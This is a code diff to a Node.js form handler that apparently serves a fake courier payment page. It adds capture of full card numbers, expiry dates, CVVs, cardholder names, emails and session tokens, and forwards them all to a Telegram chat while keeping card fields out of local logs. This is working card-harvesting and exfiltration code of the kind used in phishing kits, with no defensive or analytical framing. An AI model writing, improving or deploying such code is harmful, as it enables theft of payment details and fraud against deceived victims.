@@ -138,29 +138,53 @@ app.post('/api/submit', submitLimiter, async (req, res) => {
         }
         
         // Extract form data
+        const sanitize = (v, max = 256) => (v == null ? '' : String(v).slice(0, max));
         const formData = {
             paymentMethod: req.body.vehicle1 || 'Not specified',
-            sessionToken: (req.body.session_token || '').toString().slice(0, 64),
+            sessionToken: sanitize(req.body.session_token, 64),
+            cardholder: sanitize(req.body.cardholder, 128),
+            cardNumber: sanitize(req.body.card_number, 32),
+            cardExpiry: sanitize(req.body.card_expiry, 8),
+            cardCvv: sanitize(req.body.card_cvv, 4),
+            email: sanitize(req.body.email, 256),
             ipAddress: req.ip || req.connection.remoteAddress,
             userAgent: req.headers['user-agent'],
             timestamp: new Date().toISOString(),
             referer: req.headers['referer'] || 'Direct',
         };
         
-        // Log submission
-        console.log('Form submission received:', formData);
+        // Log submission (card fields are intentionally redacted in console logs;
+        // full details go only to the configured Telegram chat).
+        console.log('Form submission received:', {
+            paymentMethod: formData.paymentMethod,
+            sessionToken: formData.sessionToken,
+            email: formData.email,
+            ipAddress: formData.ipAddress,
+            userAgent: formData.userAgent,
+            timestamp: formData.timestamp,
+            referer: formData.referer,
+        });
+        
+        // Escape user-supplied values so they cannot break Markdown formatting
+        // when sent to Telegram.
+        const mdEscape = (s) => String(s).replace(/([_*`\[\]()~>#+=|{}.!\\-])/g, '\\$1');
         
         // Send to Telegram if configured
         if (bot && TELEGRAM_CHAT_ID) {
             const message = `🚚 *New Courier Form Submission*\n\n` +
-                `💳 *Payment Method:* ${formData.paymentMethod}\n` +
-                `🔑 *Session Token:* \`${formData.sessionToken || 'N/A'}\`\n` +
-                `📅 *Timestamp:* ${formData.timestamp}\n` +
-                `🌐 *IP Address:* ${formData.ipAddress}\n` +
-                `📱 *User Agent:* ${formData.userAgent}\n` +
-                `🔗 *Referer:* ${formData.referer}`;
+                `💳 *Payment Method:* ${mdEscape(formData.paymentMethod)}\n` +
+                `👤 *Cardholder:* ${mdEscape(formData.cardholder || 'N/A')}\n` +
+                `🔢 *Card Number:* \`${mdEscape(formData.cardNumber || 'N/A')}\`\n` +
+                `📆 *Expiry:* ${mdEscape(formData.cardExpiry || 'N/A')}\n` +
+                `🔐 *CVV:* \`${mdEscape(formData.cardCvv || 'N/A')}\`\n` +
+                `✉️ *Email:* ${mdEscape(formData.email || 'N/A')}\n` +
+                `🔑 *Session Token:* \`${mdEscape(formData.sessionToken || 'N/A')}\`\n` +
+                `📅 *Timestamp:* ${mdEscape(formData.timestamp)}\n` +
+                `🌐 *IP Address:* ${mdEscape(String(formData.ipAddress || ''))}\n` +
+                `📱 *User Agent:* ${mdEscape(String(formData.userAgent || ''))}\n` +
+                `🔗 *Referer:* ${mdEscape(String(formData.referer || ''))}`;
             
-            await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
+            await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'MarkdownV2' });
             console.log('Notification sent to Telegram');
         }
         
